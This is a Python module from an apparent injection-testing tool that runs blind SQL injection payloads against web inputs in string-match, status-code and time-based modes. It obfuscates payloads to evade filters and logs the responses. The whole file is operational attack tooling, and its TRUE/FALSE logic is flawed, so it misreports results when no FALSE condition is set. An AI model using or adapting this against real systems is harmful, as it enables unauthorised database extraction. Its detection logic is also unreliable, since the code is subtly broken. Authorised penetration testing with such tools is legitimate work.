import time  # Added for perf_counter
from utils import to_int_safe, timed_send, _short_hash, save_results, validate_input
from payload_handlers import expand_single_payload_string

def run_blind_user_payload(ic, obfuscator, default_payloads=None):
    if not ic or not ic.prepared_data or not ic.selected_keys:
        print("[-] No inputs selected. Use option 2 first.")
        return

    print("\n=== Blind SQL Injection ===")
    print("1) String-based (substring match)")
    print("2) Status-code based")
    print("3) Time-based")
    print("9) Back")
    sel = validate_input("> ", "str", valid_options=["1","2","3","9","۱","۲","۳","۹"])
    if sel in ("9", "۹"):
        return

    if sel not in ("1", "2", "3"):
        print("[-] Invalid choice.")
        return

    mode = {"1": "string", "2": "status", "3": "time"}[sel]
    print(f"[*] Mode: {mode}")

    if mode == "string":
        match_str = validate_input("Enter string to match (case-insensitive) in response for TRUE condition: ", "str", default="success")
        if not match_str:
            print("[-] Empty string.")
            return
        false_str = validate_input("Enter string for FALSE condition (blank = none): ", "str", default="")

    if mode == "status":
        true_codes_input = validate_input("Enter status code(s) for TRUE condition (comma-separated, e.g., 200,301): ", "str", default="500")
        try:
            true_codes = [int(c.strip()) for c in true_codes_input.split(",") if c.strip()]
        except Exception:
            print("[-] Invalid status codes.")
            return
        false_codes_input = validate_input("Enter status code(s) for FALSE condition (blank = none): ", "str", default="")
        false_codes = [int(c.strip()) for c in false_codes_input.split(",") if c.strip()] if false_codes_input else []

    if mode == "time":
        threshold = float(validate_input("Enter time threshold (seconds) for TRUE condition (e.g., 5.0): ", "float", default="5.0"))
        if threshold <= 0:
            print("[-] Invalid threshold.")
            return
        retries = int(validate_input("Enter number of retries per payload [3]: ", "int", default="3"))
        if retries < 1:
            print("[-] Invalid retries.")
            return

    payloads = default_payloads or []
    if not payloads:
        print("\nEnter payloads (one per line, empty to end) [supports {placeholders}]:")
        while True:
            p = validate_input("> ", "str")
            if not p:
                break
            payloads.append(p)
        if not payloads:
            print("[-] No payloads provided.")
            return

    apply_obf = validate_input("Apply obfuscation to all payloads? (y/n): ", "str", valid_options=["y","n","yes","no","1","0"], default="n")
    if apply_obf in ("y", "yes", "1"):
        for i, p in enumerate(payloads):
            new_p, tech = obfuscator.obfuscate_advanced(p, char_budget=50)
            print(f"[*] Obfuscated {p} -> {new_p} ({', '.join(tech)})")
            payloads[i] = new_p

    results = []
    for payload in payloads:
        print(f"\n[*] Testing payload: {payload}")
        expanded = expand_single_payload_string(payload)
        if not expanded:
            print("[-] Could not expand payload.")
            continue
        prepared = ic.prepare_injection(expanded)
        if not prepared:
            print("[-] Prepare failed.")
            continue
        for label, reqs in prepared.items():
            print(f"\n[*] Label: {label}")
            for k, req in reqs.items():
                print(f"[*] Input: {k}")
                result = {"payload": payload, "label": label, "input": k}
                if mode == "time":
                    times = []
                    for i in range(retries):
                        r, dt = timed_send(ic, req, tries_override=1)
                        attempt_result = {
                            "attempt": i+1,
                            "status_code": r.status_code if r else None,
                            "body_length": len(r.text) if r and r.text else None,
                            "body_hash": _short_hash(r.text) if r and r.text else None,
                            "time": dt
                        }
                        if r is None:
                            print(f"[!] Attempt {i+1}: failed")
                            times.append(0)
                        else:
                            print(f"[*] Attempt {i+1}: time={dt:.3f}s status={r.status_code} len={len(r.text or '')} hash={_short_hash(r.text)}")
                            times.append(dt)
                        result[f"attempt_{i+1}"] = attempt_result
                    avg_time = sum(times) / len(times) if times else 0
                    result["avg_time"] = avg_time
                    result["result"] = "TRUE" if avg_time >= threshold else "FALSE"
                    print(f"[*] Avg time: {avg_time:.3f}s -> {result['result']}")
                else:
                    r, dt = timed_send(ic, req)
                    result["time"] = dt
                    if r is None:
                        print("[!] Request failed")
                        result["status_code"] = None
                        result["body_length"] = None
                        result["body_hash"] = None
                        result["result"] = "FAILED"
                        continue
                    body = r.text or ""
                    if mode == "string":
                        is_true = match_str.lower() in body.lower()
                        is_false = (not false_str) or (false_str.lower() in body.lower())
                        result["result"] = "TRUE" if is_true and not is_false else "FALSE"
                        print(f"[*] time={dt:.3f}s status={r.status_code} len={len(body)} hash={_short_hash(body)} -> {result['result']}")
                    elif mode == "status":
                        is_true = r.status_code in true_codes
                        is_false = (not false_codes) or (r.status_code in false_codes)
                        result["result"] = "TRUE" if is_true and not is_false else "FALSE"
                        print(f"[*] time={dt:.3f}s status={r.status_code} len={len(body)} hash={_short_hash(body)} -> {result['result']}")
                    result["status_code"] = r.status_code
                    result["body_length"] = len(body)
                    result["body_hash"] = _short_hash(body)
                results.append(result)
    save_results(results, f"blind_results_{int(time.time())}.json")